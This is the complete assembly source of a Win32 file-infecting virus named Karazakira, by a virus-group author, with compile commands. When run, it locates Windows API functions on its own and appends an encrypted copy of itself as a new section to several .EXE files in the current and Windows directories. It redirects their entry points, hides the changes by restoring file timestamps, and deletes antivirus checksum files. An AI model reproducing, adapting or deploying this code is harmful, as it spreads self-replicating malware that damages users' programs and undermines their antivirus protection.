;  _      __    ____    __    ___     __    _     _   ____    __
; | |/\  /  \  | _  \  /  \  / _ \   /  \  | |/\ | | | _  \  /  \
; |  _/ | || | |    / | || | |// /  | || | |  _/ | | |    / | || |
; |   \ |    | | |\ \ |    |  / /|\ |    | |   \ | | | |\ \ |    |
; |_|\/ |_||_| |_||_| |_||_| /____/ |_||_| |_|\/ |_| |_||_| |_||_|
; By Psychologic/rRlf
;

; Kara-Intro :
;
; This is my 3rd win32asm virus, I named it as an Indian's ring "KARAZAKIRA"
; which belived can call a soul from the deathman (a man who has been die)
; well, I think this is unique name.


; Workz :
;
; When Karazakira file executed, Karazakira searches for 4 PE *.EXE files in the current
; and windows directory. Those files will be infected by adding a new section called
; ".Karazakira" (called in infect section as ptr [edi], "raK.").
; File modification works by direct access, not by memory mapping (Bad idea right..??)
; well it just for different touch, hehe :P

; Feature :
;
; * full Win32 compatible
; * encrypted using DIV algorithm
; * Infecting windows directory
; * Deleting some AV checksum files

; Compile :
;
; tasm32 /mx /m karazakira.asm
; tlink32 /Tpe /aa karazakira.obj,,, import32.lib

; ====================================================================================
; ====================================================================================
;
; ====================================================================================
; ====================================================================================


length_virus_file       EQU (end_static - start)
length_virus_mem        EQU (end_mem - start)
length_encrypted        EQU (end_encrypted - encrypted)
length_PE_header        EQU 1000

Extrn MessageBoxA:Proc
Extrn ExitProcess:Proc

.386p
.model flat

.data
start:
        pushad
        pushfd

        db 0BDh
delta_offset    dd 0

        lea esi, [ebp+offset encrypted]
        mov edi, esi
        mov ecx, length_encrypted / 8
        db 0BBh
crypt_key       dd 0


rush_code:
copyright       db "Win32.Karazakira By Psychologic", 0
                db "On Friday, second January '05 - Depok City, Indonesia", 0

GetProcAddress       db "GetProcAddress", 0
l_GPA                = $ - offset GetProcAddress

FindFirstFileA       db "FindFirstFileA", 0
FindNextFileA        db "FindNextFileA", 0
FindClose            db "FindClose", 0
CreateFileA          db "CreateFileA", 0
CloseHandle          db "CloseHandle", 0
ReadFile             db "ReadFile", 0
WriteFile            db "WriteFile", 0
DeleteFileA          db "DeleteFileA", 0
SetFilePointer       db "SetFilePointer", 0
SetFileAttributesA   db "SetFileAttributesA", 0
SetFileTime          db "SetFileTime", 0
SetCurrentDirectoryA db "SetCurrentDirectoryA", 0
GetCurrentDirectoryA db "GetCurrentDirectoryA", 0
GetWindowsDirectoryA db "GetWindowsDirectoryA", 0
GetSystemDirectoryA  db "GetSystemDirectoryA", 0
GetTickCount         db "GetTickCount", 0

anti_vir_dat    db "ANTI-VIR.DAT", 0
chklist_ms      db "CHKLIST.MS", 0
chklist_cps     db "CHKLIST.CPS", 0
avp_crc         db "AVP.CRC", 0

orig_eip        dd offset quit_1st_gen
filemask        db "*.EXE", 0

new_section_header:
                db ".Karazakira", 0, 0
VirtualSize     dd length_virus_mem
VirtualAddress  dd 0
PhysicalSize    dd length_virus_file
PhysicalAddress dd 0
                dd 0, 0, 0
                dd 0E0000020h

if ((($-encrypted) mod 8) NE 0)
        db (8-(($-encrypted) mod 8)) dup(0)
endif

decrypt:
        lodsd
        xchg eax, edx
        lodsd
        cmp edx, ebx
        JA no_mul
        push ebx
        push edx
        mul ebx
        pop ebx
        add eax, ebx
        adc edx, 0
        pop ebx
        stosd
        xchg eax, edx
        stosd
        LOOP decrypt
        JMP encrypted

no_mul:
        stosd
        xchg eax, edx
        stosd
        LOOP decrypt

encrypted:
        mov eax, [ebp+offset orig_eip]
        mov [ebp+offset host_entry], eax
        push offset seh_handler
        push dword ptr fs:[0]
        mov fs:[0], esp
        mov eax, [esp+11*4]

scan_kernel:
        cmp word ptr [eax], "ZM"
        JNE kernel_not_found
        mov ebx, [eax+3Ch]
        add ebx, eax
        cmp dword ptr [ebx], "EP"
        JE kernel32_found

kernel_not_found:
        dec eax
        JMP scan_kernel

kernel32_found:
        mov [ebp+offset kernel32], eax
        mov ebx, [ebx+120]
        add ebx, eax
        mov edx, [ebx+20h]
        add edx, eax
        mov ecx, [ebx+18h]

GPA_search:
        push ecx
        mov esi, [edx]
        add esi, eax
        lea edi, [ebp+offset GetProcAddress]
        mov ecx, l_GPA
        cld
        rep cmpsb
        pop ecx
        JE GPA_found
        inc edx
        inc edx
        inc edx
        inc edx
        LOOP GPA_search

GPA_not_found:
        JMP return_to_host

GPA_found:
        mov edx, [ebx+18h]
        sub edx, ecx
        shl edx, 1
        add edx, [ebx+24h]
        add edx, eax
        xor ecx, ecx
        mov cx, [edx]
        shl ecx, 2
        add ecx, [ebx+1Ch]
        add ecx, eax
        mov ebx, [ecx]
        add ebx, eax
        mov [ebp+offset GPA_addr], ebx
        lea eax, [ebp+offset curdir]
        push eax
        push 260
        lea eax, [ebp+offset GetCurrentDirectoryA]
        call call_API
        push 260
        lea eax, [ebp+offset windir]
        push eax
        lea eax, [ebp+offset GetWindowsDirectoryA]
        call call_API
        lea eax, [ebp+offset windir]
        push eax
        lea eax, [ebp+offset SetCurrentDirectoryA]
        call call_API
        call infect_dir
        lea eax, [ebp+offset curdir]
        push eax
        lea eax, [ebp+offset SetCurrentDirectoryA]
        call call_API
        call infect_dir

return_to_host:
        pop dword ptr fs:[0]
        pop eax
        popfd
        popad
        db 068h
host_entry      dd 0
        ret

seh_handler:
        mov esp, [esp+8]
        JMP return_to_host

infect_dir:
        mov dword ptr [ebp+infectioncount], 4
        lea eax, [ebp+offset anti_vir_dat]
        call kill_file
        lea eax, [ebp+offset chklist_ms]
        call kill_file
        lea eax, [ebp+offset chklist_cps]
        call kill_file
        lea eax, [ebp+offset avp_crc]
        call kill_file
        lea eax, [ebp+offset find_data]
        push eax
        lea eax, [ebp+offset filemask]
        push eax
        lea eax, [ebp+offset FindFirstFileA]
        call call_API
        mov [ebp+offset search_handle], eax
        inc eax
        JZ end_infect_dir

infect:
        push 80h
        lea eax, [ebp+offset FileName]
        push eax
        lea eax, [ebp+offset SetFileAttributesA]
        call call_API
        push 0
        push 80h
        push 3
        push 0
        push 0
        push 0C0000000h
        lea eax, [ebp+offset FileName]
        push eax
        lea eax, [ebp+offset CreateFileA]
        call call_API
        mov [ebp+offset file_handle], eax
        inc eax
        JZ restore_attributes
        push 0
        lea eax, [ebp+offset bytes_read]
        push eax
        push 64
        lea eax, [ebp+offset dos_header]
        push eax
        push [ebp+file_handle]
        lea eax, [ebp+offset ReadFile]
        call call_API
        cmp word ptr [ebp+offset exe_marker], "ZM"
        JNE close
        push 0
        push 0
        push dword ptr [ebp+offset new_header]
        push dword ptr [ebp+offset file_handle]
        lea eax, [ebp+offset SetFilePointer]
        call call_API
        push 0
        lea eax, [ebp+offset bytes_read]
        push eax
        push length_pe_header
        lea eax, [ebp+offset pe_header]
        push eax
        push dword ptr [ebp+file_handle]
        lea eax, [ebp+offset ReadFile]
        call call_API
        cmp dword ptr [ebp+offset pe_marker], "EP"
        JNE close
        test word ptr [ebp+offset flags], 0010000000000000b
        JNZ close
        lea ebx, [ebp+offset optional_header]
        add bx, word ptr [ebp+offset SizeOfOptHeader]
        xor eax, eax
        mov ax, word ptr [ebp+offset NumberOfSections]
        dec eax
        mov ecx, 40
        mul ecx
        add eax, ebx
        mov edi, eax
        cmp dword ptr [edi], "raK."
        JE close
        mov eax, [ebp+offset EntryPoint]
        add eax, [ebp+offset ImageBase]
        mov [ebp+offset orig_eip], eax
        inc word ptr [ebp+offset NumberOfSections]
        mov eax, [edi+12]
        add eax, [edi+8]
        mov ebx, [ebp+offset SectionAlign]
        call align_EAX
        mov [ebp+offset VirtualAddress], eax
        mov [ebp+offset EntryPoint], eax
        add eax, [ebp+offset ImageBase]
        sub eax, offset start
        mov [ebp+offset delta_offset], eax
        mov eax, length_virus_mem
        call align_EAX
        add dword ptr [ebp+offset SizeOfImage], EAX
        mov eax, [edi+20]
        add eax, [edi+16]
        mov ebx, [ebp+offset FileAlign]
        call align_EAX
        mov [ebp+offset PhysicalAddress], eax
        push 0
        push 0
        push eax
        push dword ptr [ebp+offset file_handle]
        lea eax, [ebp+offset SetFilePointer]
        call call_API
        mov eax, length_virus_file
        call align_EAX
        mov [ebp+PhysicalSize], eax
        mov ecx, 40
        lea esi, [ebp+offset new_section_header]
        add edi, ecx
        cld
        pusha
        xor eax, eax
        repe scasb
        popa
        JNE close
        rep movsb
        push eax
        lea eax, [ebp+offset GetTickCount]
        call call_API
        mov ebx, eax
        ror eax, 8
        xor ebx, eax
        mov [ebp+offset crypt_key], ebx
        lea esi, [ebp+offset start]
        lea edi, [ebp+offset crypt_buffer]
        mov ecx, length_virus_file
        rep movsb
        lea esi, [ebp+offset crypt_buffer+(encrypted-start)]
        mov edi, esi
        mov cx, length_encrypted / 8

encrypt:
        lodsd
        xchg eax, edx
        lodsd
        xchg eax, edx
        cmp edx, ebx
        JA no_div
        div ebx

no_div:
        xchg eax, edx
        stosd
        xchg eax, edx
        stosd
        loop  encrypt
        pop eax
        push 0
        lea ecx, [ebp+offset bytes_read]
        push ecx
        push eax
        lea eax, [ebp+offset crypt_buffer]
        push eax
        push dword ptr [ebp+file_handle]
        lea eax, [ebp+offset WriteFile]
        call call_API
        push 0
        push 0
        push dword ptr [ebp+offset new_header]
        push dword ptr [ebp+offset file_handle]
        lea eax, [ebp+offset SetFilePointer]
        call call_API
        push 0
        lea eax, [ebp+offset bytes_read]
        push eax
        push length_pe_header
        lea eax, [ebp+offset pe_header]
        push eax
        push dword ptr [ebp+file_handle]
        lea eax, [ebp+offset WriteFile]
        call call_API
        dec dword ptr [ebp+infectioncount]

close:
        lea eax, [ebp+offset LastWriteTime]
        push eax
        lea eax, [ebp+offset LastAccessTime]
        push eax
        lea eax, [ebp+offset CreationTime]
        push eax
        push dword ptr [ebp+offset file_handle]
        lea eax, [ebp+offset SetFileTime]
        call call_API
        push dword ptr [ebp+offset file_handle]
        lea eax, [ebp+offset CloseHandle]
        call call_API

restore_attributes:
        push dword ptr [ebp+offset FileAttributes]
        lea eax, [ebp+offset FileName]
        push eax
        lea eax, [ebp+offset SetFileAttributesA]
        call call_API

find_next:
        mov ecx, [ebp+infectioncount]
        JCXZ close_find
        lea eax, [ebp+offset find_data]
        push eax
        push dword ptr [ebp+offset search_handle]
        lea eax, [ebp+offset FindNextFileA]
        call call_API
        dec eax
        JZ infect

close_find:
        push dword ptr [ebp+offset search_handle]
        lea eax, [ebp+offset FindClose]
        call call_API

end_infect_dir:
        ret

kill_file:
        push eax
        push 80h
        push eax
        lea eax, [ebp+offset SetFileAttributesA]
        call call_API
        lea eax, [ebp+offset DeleteFileA]
        call call_API
        RET

call_API:
        push eax
        push dword ptr [ebp+offset kernel32]
        call [ebp+offset GPA_addr]
        JMP eax

align_EAX:
        xor edx, edx
        div ebx
        or edx, edx
        JZ no_round_up
        inc eax

no_round_up:
        mul ebx
        RET


end_encrypted:
end_static:

heap:
crypt_buffer     db length_virus_file dup(?)

padding          db 1024 dup(?)

windir           db 260 dup(?)
curdir           db 260 dup(?)

kernel32         dd ?
GPA_addr         dd ?

search_handle    dd ?
file_handle      dd ?
bytes_read       dd ?
infectioncount   dd ?

find_data:
FileAttributes   dd ?
CreationTime     dq ?
LastAccessTime   dq ?
LastWriteTime    dq ?
FileSize         dq ?
wfd_reserved     dq ?
FileName         db 260 dup(?)
DosFileName      db 14 dup(?)

dos_header:
exe_marker       dw ?
dosheader_shit   db 58 dup(?)
new_header       dd ?

pe_header:
pe_marker        dd ?
machine          dw ?
NumberOfSections dw ?
TimeDateStamp    dd ?
DebugShit        dq ?
SizeOfOptHeader  dw ?
flags            dw ?
optional_header:
optional_magic   dw ?
linkerversion    dw ?
SizeOfCode       dd ?
SizeOfDATA       dd ?
SizeOfBSS        dd ?
EntryPoint       dd ?
BaseOfCode       dd ?
BaseOfData       dd ?
ImageBase        dd ?
SectionAlign     dd ?
FileAlign        dd ?
OSVersion        dd ?
OurVersion       dd ?
SubVersion       dd ?
reserved1        dd ?
SizeOfImage      dd ?
SizeOfHeader     dd ?
Checksum         dd ?

org offset pe_header+length_pe_header

end_mem:
.code
start_1st_gen:
        pushad
        pushfd
        xor ebp, ebp
        JMP encrypted

quit_1st_gen:
        push 0
        push offset caption
        push offset message
        push 0
        call MessageBoxA
        push 0
        call ExitProcess

caption:
db "Win32.Karazakira by Psychologic"
        db 0
message db "Freee palestine...freee palestine", 0

end start_1st_gen


